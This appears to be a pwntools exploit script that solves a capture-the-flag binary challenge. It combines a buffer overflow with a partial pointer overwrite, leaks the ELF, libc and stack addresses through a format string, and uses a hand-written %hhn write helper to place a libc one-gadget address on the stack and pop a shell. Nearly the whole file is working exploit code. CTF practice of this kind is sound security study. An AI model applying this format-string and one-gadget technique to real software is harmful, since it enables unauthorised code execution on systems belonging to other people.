from pwn import *
from icecream import ic

exe = ELF("./chall_patched")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def formatthingy(base, f, g):
    payload = b''
    l = {}
    x = []
    z = []
    y = []
    for i in range(len(f)//8):
        x.append(hex(u64(f[i*8:8+(i*8)]))[2:].rjust(16, '0'))
        z.append(u64(g[i*8:8+(i*8)]))
    print(x)
    print(z)
    for j in range(len(x)):
        for i in range(8):
            if i == 0:
                l[z[j]+i] = int(x[j][-2-(i*2):], 16)
                y.append(int(x[j][-2-(i*2):], 16))
            else:
                l[z[j]+i] = int(x[j][-2-(i*2):-(i*2)], 16)
                y.append(int(x[j][-2-(i*2):-(i*2)], 16))
    t = []
    for i in range(len(y)):
        t.append(0)
    y.sort()

    for i in range(len(y)):
        if i == 0:
            if y[i] == 0:
                payload += "%0$hhn".format(y[i]).encode()
            else: 
                payload += "%{0}c%0$hhn".format(y[i]).encode()
        else:
            if y[i] == y[i-1]:
                payload += "%0$hhn".encode()
            else:
                payload += "%{0}c%0$hhn".format(y[i]-y[i-1]).encode()
    payload += b'a'*(8-(len(payload)%8))
    offset = (len(payload)//8)+base
    for i in range(2):
        payload = b''
        for i in range(len(y)):
            if i == 0:
                if y[i] == 0:
                    payload += "%{0}$hhn".format(offset).encode()
                    offset += 1
                else:
                    payload += "%{0}c%{1}$hhn".format(y[i], offset).encode()
                    offset += 1
            else:
                if y[i] == 0 or y[i] == y[i-1]:
                    payload += "%{0}$hhn".format(offset).encode()
                    offset += 1
                else:
                    payload += "%{0}c%{1}$hhn".format(y[i]-y[i-1], offset).encode()
                    offset += 1
        payload += b'a'*(8-(len(payload)%8))
        offset = (len(payload)//8)+base
    print(l)
    for i in range(len(y)):
        x = (list(l.keys())[list(l.values()).index(y[i])])
        payload += p64(x)
        l.pop(x)
    return payload


gdbscript = '''
pie b 0x0000000000001346
c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

r = start()

def edit(val):
    sla(b">", b'1')
    sa(b"xt:", val)

def save():
    sla(b">", b'2')

def exit():
    sla(b">", b'3')

def error(inp):
    sla(b">", inp)

# payload = b"%p"*100
payload = b'a'*(256)
payload += b'\x20\x80'
# payload += b'%p'+b'\x00'*6
# payload = b'%p%p%p%p'
edit(payload)
save()
error(b'4')

payload = b'%7$p.%45$p.%6$p'

edit(payload)
save()
error(b'4')
re(1)
elf_leak = int(re(14), 16)
re(1)
libc_leak = int(re(14), 16)
re(1)
stack_leak = int(re(14), 16)
ic(hex(elf_leak))
ic(hex(libc_leak))
ic(hex(stack_leak))
elf_base = elf_leak-0x1406
libc_base = libc_leak-0x29d90
stack_ow = stack_leak-0x128
oneshot = libc_base+0xebc85

payload = formatthingy(10, p64(oneshot), p64(stack_ow))
edit(payload)
save()
error(b'4')
i()
